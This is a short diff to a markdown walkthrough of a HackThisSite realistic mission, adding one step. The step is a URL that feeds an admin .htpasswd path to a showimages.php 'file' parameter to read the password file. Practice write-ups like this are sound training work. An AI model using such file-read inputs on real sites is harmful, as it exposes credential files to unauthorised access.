@@ -154,8 +154,11 @@ Start on: [Direct Link](https://www.hackthissite.org/playlevel/6/)
 ## Steps:
 
 
-
 ## Steps:
+
+view-source:https://www.hackthissite.org/missions/realistic/7/showimages.php?file=/images/admin/.htpasswd
+
+
 
 # Key Takeaway:
 
